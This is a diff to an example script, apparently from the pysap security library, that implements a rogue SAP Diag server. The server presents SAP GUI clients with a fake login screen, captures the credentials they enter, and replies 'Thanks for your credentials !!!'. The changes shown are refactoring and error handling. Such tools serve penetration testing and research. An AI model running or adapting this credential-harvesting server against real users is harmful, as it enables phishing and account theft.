@@ -112,7 +112,7 @@ class SAPDiagServerHandler(SAPNIServerHandler):
                                                           SAPDiagDyntAtomItem(atom_length=81, attr_DIAG_BSD_YES3D=1L, xmlprop_text='<Propertybag><DefaultTooltip>Language</DefaultTooltip></Propertybag>', etype=120, col=20, block=1, row=5),
                                                           SAPDiagDyntAtomItem(field2_text=self.session_title, field2_maxnrchars=18, row=7, dlg_flag_2=2, atom_length=37, etype=132, attr_DIAG_BSD_PROTECTED=1L, field2_mlen=18, field2_dlen=18, attr_DIAG_BSD_PROPFONT=1L, block=1, col=1),
                                                           ]), item_type=18, item_id=9, item_sid=2),
-            ]
+        ]
 
     def make_error_screen(self, message):
         return [SAPDiagItem(item_value=support_data_sapnw_702, item_type=16, item_id=6, item_sid=17),
@@ -134,12 +134,15 @@ class SAPDiagServerHandler(SAPNIServerHandler):
 
     def logoff(self):
         print "[*] Logging off the client %s" % str(self.client_address)
-        self.request.send(str(SAPNI() / SAPDiag(com_flag_TERM_EOP=1, com_flag_TERM_EOC=1, compress=0)))
-        self.request.close()
+        try:
+            self.request.send(SAPDiag(com_flag_TERM_EOP=1, com_flag_TERM_EOC=1, compress=0))
+            self.request.close()
+        except:
+            pass
         del(self.server.clients[self.client_address])
 
     def handle_data(self):
-        if self.server.clients[self.client_address].init:
+        if self.client_address in self.server.clients and self.server.clients[self.client_address].init:
             print "[*] Already initialized client %s" % str(self.client_address)
             self.handle_msg()
         else:
@@ -147,11 +150,14 @@ class SAPDiagServerHandler(SAPNIServerHandler):
             self.handle_init()
 
     def handle_init(self):
+        # For initialization we need to decode the packet as SAPDiagDP
+        self.packet.decode_payload_as(SAPDiagDP)
         if SAPDiagDP in self.packet:
             self.server.clients[self.client_address].init = True
             self.server.clients[self.client_address].terminal = self.packet[SAPDiagDP].terminal
-            print "[*] Client %s set to initialized (terminal: %s)" % (str(self.client_address), self.server.clients[self.client_address].terminal)
-            self.request.send(str(SAPNI() / SAPDiag(compress=0, message=self.make_login_screen())))
+            print "[*] Client %s set to initialized (terminal: %s)" % (str(self.client_address),
+                                                                       self.server.clients[self.client_address].terminal)
+            self.request.send(SAPDiag(compress=0, message=self.make_login_screen()))
         else:
             print "[-] Error during initialization of client %s" % str(self.client_address)
             self.logoff()
@@ -206,12 +212,15 @@ class SAPDiagServerHandler(SAPNIServerHandler):
                         print "[*]\tRegular field:\t%s" % (text)
 
             print "[*] Sending error message to client %s" % str(self.client_address)
-            self.request.send(str(SAPNI() / SAPDiag(compress=1, message=self.make_error_screen("Thanks for your credentials !!!"))))
+            self.request.send(SAPDiag(compress=1, message=self.make_error_screen("Thanks for your credentials !!!")))
 
         # Otherwise we send an error message
         else:
             print "[*] Sending error message to client %s" % str(self.client_address)
-            self.request.send(str(SAPNI() / SAPDiag(compress=0, message=self.make_error_screen("E: Unable to process your request, try later"))))
+            try:
+                self.request.send(SAPDiag(compress=0, message=self.make_error_screen("E: Unable to process your request, try later")))
+            except:
+                pass
 
 
 class SAPDiagThreadedServer(SAPNIServerThreaded):
@@ -222,7 +231,9 @@ class SAPDiagThreadedServer(SAPNIServerThreaded):
 def parse_options():
 
     description = \
-    """This example script implements a rogue server using the Diag protocol. It offers users a customizable login screen and gathers entered credentials. Tested with SAP Gui for Java 7.20 Patch Level 5 running on Ubuntu.
+    """This example script implements a rogue server using the Diag protocol.
+    It offers users a customizable login screen and gathers entered credentials.
+    Tested with SAP Gui for Java 7.20 Patch Level 5 running on Ubuntu.
     """
 
     epilog = "pysap %(version)s - %(url)s - %(repo)s" % {"version": pysap.__version__,
@@ -261,7 +272,9 @@ def main():
         logging.basicConfig(level=logging.DEBUG)
 
     print "[*] Setting up the Diag server on %s:%d" % (options.local_host, options.local_port)
-    server = SAPDiagThreadedServer((options.local_host, options.local_port), SAPDiagServerHandler)
+    server = SAPDiagThreadedServer((options.local_host, options.local_port),
+                                   SAPDiagServerHandler,
+                                   base_cls=SAPDiag)
     server.allow_reuse_address = True
     server.options = options
     print "[*] Waiting for clients ..."
